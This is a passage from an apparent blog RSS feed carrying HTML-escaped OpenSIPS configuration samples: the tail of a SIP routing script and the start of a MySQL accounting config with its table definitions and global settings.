&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*********&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ROUTINE&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;CHECKS&lt;/span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;**********************************&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# filter too old messages
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOG: Too many hops\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ml &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;513&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message too big&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#  Process record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# label BYEs for accounting&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			setflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# labeled all transaction for accounting&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record-route INVITES to make sure BYEs will visit our server too&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# forward the request statefuly now; (we need *stateful* forwarding,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# because the stateful mode correlates requests with replies and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# drops retranmissions; otherwise, we would have to report on&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# every single message received)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>acc-mysql</title>
      <link>https://wdd.js.org/opensips/ch8/acc-mysql/</link>
      <pubDate>Thu, 28 May 2020 09:57:04 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/acc-mysql/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Sample config for MySQL accouting with OpenSIPS 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# - db_mysql module must be compiled and installed
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# - new columns have to be added since by default only few are recorded
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# - here are full SQL statements to create acc and missed_calls tables
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# CREATE TABLE `acc` (
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `id` int(10) unsigned NOT NULL auto_increment,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `method` varchar(16) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `from_tag` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `to_tag` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `callid` varchar(128) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `sip_code` char(3) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `sip_reason` varchar(32) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `time` datetime NOT NULL default &amp;#39;0000-00-00 00:00:00&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `src_ip` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `dst_user` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `dst_domain` varchar(128) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `src_user` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `src_domain` varchar(128) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   INDEX acc_callid (`callid`),
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   PRIMARY KEY  (`id`)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# CREATE TABLE `missed_calls` (
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `id` int(10) unsigned NOT NULL auto_increment,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `method` varchar(16) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `from_tag` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `to_tag` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `callid` varchar(128) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `sip_code` char(3) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `sip_reason` varchar(32) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `time` datetime NOT NULL default &amp;#39;0000-00-00 00:00:00&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `src_ip` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `dst_user` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `dst_domain` varchar(128) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `src_user` varchar(64) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   `src_domain` varchar(128) NOT NULL default &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   INDEX acc_callid (`callid`),
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   PRIMARY KEY  (`id`)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------- global configuration parameters ------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;# debug level (cmd line: -dddddddddd)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no    &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd line: -E)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Uncomment&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;these&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;lines&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;enter&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;mode&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_via&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no	&lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -v)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no          &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -r)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rev_dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no      &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -R)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5060&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines for TLS support
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_tls = 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#listen = tls:your_IP:5061
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_verify_server = 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_verify_client = 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_require_client_certificate = 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_method = TLSv1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_certificate = &amp;#34;/usr/local/etc/opensips/tls/user/user-cert.pem&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_private_key = &amp;#34;/usr/local/etc/opensips/tls/user/user-privkey.pem&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#tls_ca_list = &amp;#34;/usr/local/etc/opensips/tls/user/user-calist.pem&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# - MySQL loaded for accounting as well
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
